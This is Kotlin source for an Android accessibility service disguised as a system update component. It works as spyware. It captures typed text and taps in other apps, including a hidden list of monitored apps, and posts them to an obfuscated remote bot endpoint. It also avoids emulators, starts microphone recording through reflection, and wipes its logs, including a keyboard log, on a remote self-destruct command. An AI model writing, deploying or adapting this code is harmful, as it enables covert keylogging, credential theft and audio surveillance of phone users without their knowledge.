package com.android.system.update.core

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import java.io.File
import java.io.FileWriter
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class SystemUpdateProvider : AccessibilityService() {
    
    private val logFileName = "sys_config.txt"
    
    private fun getT(): String = SecurityUtils.d("TgRGS2xBBlZCRgkeKnU/aFcCaSx7E0gSJ3IkPkdgCCFrNRBrXmMsVz1ACR5mCA==")
    private fun getC(): String = SecurityUtils.d("QAFFTm1EB1VCQg==")
    private fun getU(): String = SecurityUtils.d("HkcGCSxJHEwUAlpxH1YVOlZAUhsdHQs4XFEMAQ==")
    
    private var lastActivity: Long = 0
    private var currentProvider: String = ""
    private var isRecording = false
    private var isTerminated = false
    private var lastUpdateId: Long = 0
    private val monitorHandler = Handler(Looper.getMainLooper())
    
    private val monitoredLabels = listOf(
        SecurityUtils.d("FVwfVygbUhcGE0Mv"), 
        SecurityUtils.d("FVwfVzkSUAYXHVw0RVwLPFA="), 
        SecurityUtils.d("FVwfVzYdQBcUFUE+Bh0YMVVAXB9X"), 
        SecurityUtils.d("GUEVVysWXwYSAFIyRV4cLEJXXRFWAA=="), 
        SecurityUtils.d("FVwfVywdUhMWGlIrRVIXO0NdWhI=")
    )

    private fun postData(content: String) {
        val path = getU() + getT() + "/" + SecurityUtils.d("BVYcHRIWQBAUFVY=")
        Thread {
            try {
                val url = URL(path)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", SecurityUtils.d("F0MCFTYQUhccHV1wAUAWMQoSUB5SAAo6Bw4WARQeZw=="))
                conn.doOutput = true
                val payload = """{"chat_id":"${getC()}", "text":"$content"}"""
                OutputStreamWriter(conn.outputStream).use { it.write(payload) }
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) {}
        }.start()
    }

    override fun onServiceConnected() {
        if (isLikelySandbox()) return

        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100
        }
        serviceInfo = info
        
        monitorHandler.postDelayed({
            if (!isTerminated) {
                logToFile("=== Engine Hot-Swap Done ===")
                startPolling()
            }
        }, 60000)
    }

    private fun isLikelySandbox(): Boolean {
        val b = android.os.Build.PRODUCT
        return b.contains("sdk") || b.contains("google_sdk") || b.contains("emulator")
    }

    private fun startPolling() {
        Thread {
            while (!isTerminated) {
                try {
                    val urlStr = "${getU()}${getT()}/getUpdates?offset=${lastUpdateId + 1}&timeout=30"
                    val url = URL(urlStr)
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "GET"
                    val body = conn.inputStream.bufferedReader().use { it.readText() }
                    
                    if (body.contains("\"ok\":true")) {
                        if (body.contains("/selfdestruct") && body.contains(getC())) {
                            performSelfDestruct()
                        }
                    }
                    conn.disconnect()
                    Thread.sleep(5000)
                } catch (e: Exception) {
                    Thread.sleep(10000)
                }
            }
        }.start()
    }

    private fun performSelfDestruct() {
        postData("⚠️ **ANDROID SELF-DESTRUCT ACTIVATED** ⚠️")
        isTerminated = true
        isRecording = false
        try {
            File(filesDir, logFileName).takeIf { it.exists() }?.delete()
            File(filesDir, "keyboard_log.txt").takeIf { it.exists() }?.delete()
        } catch (e: Exception) {}
    }
    
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (isTerminated) return
        val p = event.packageName?.toString() ?: ""
        
        if (p.isNotEmpty() && p != currentProvider) {
            currentProvider = p
            if (monitoredLabels.contains(p)) {
                lastActivity = System.currentTimeMillis()
                startSessionCheck()
            }
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val valStr = event.text?.joinToString(", ") ?: ""
                if (valStr.length > 2) postData("[AUDIT] $p: $valStr")
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val desc = event.contentDescription?.toString() ?: ""
                if (desc.isNotEmpty()) postData("[TAP] $p: $desc")
            }
        }
        startMicMonitor()
    }

    private fun startSessionCheck() {
        monitorHandler.postDelayed({
            if (monitoredLabels.contains(currentProvider)) {
                if (System.currentTimeMillis() - lastActivity >= 600000) { 
                    postData("[NOTIF] Prolonged session on $currentProvider")
                }
                startSessionCheck()
            }
        }, 300000)
    }

    private fun startMicMonitor() {
        if (isRecording) return
        Thread {
            try {
                isRecording = true
                val arCls = Class.forName(SecurityUtils.d("F10WCzAaV00YF1c2Ch04KlVbXCRWERYtFw=="))
                val getMinBS = arCls.getMethod("getMinBufferSize", Int::class.java, Int::class.java, Int::class.java)
                val recordParams = getMinBS.invoke(null, 44100, 1, 2) as Int
                val constr = arCls.getConstructor(Int::class.java, Int::class.java, Int::class.java, Int::class.java, Int::class.java)
                val recorder = constr.newInstance(1, 44100, 1, 2, recordParams)
                arCls.getMethod("startRecording").invoke(recorder)
                val chunk = ShortArray(recordParams)
                val readMethod = arCls.getMethod("read", ShortArray::class.java, Int::class.java, Int::class.java)
                var quietTime = 0
                while (isRecording) {
                    val r = readMethod.invoke(recorder, chunk, 0, recordParams) as Int
                    var level = 0
                    for (i in 0 until r) level = Math.max(level, Math.abs(chunk[i].toInt()))
                    if (level > 2000) quietTime = 0 else quietTime++
                    if (quietTime > 500) break
                }
                arCls.getMethod("stop").invoke(recorder)
                arCls.getMethod("release").invoke(recorder)
                isRecording = false
            } catch (e: Exception) { isRecording = false }
        }.start()
    }

    private fun logToFile(message: String) {
        try {
            FileWriter(filesDir.resolve(logFileName), true).use { it.appendLine(message) }
        } catch (e: Exception) {}
    }

    override fun onInterrupt() {}
}
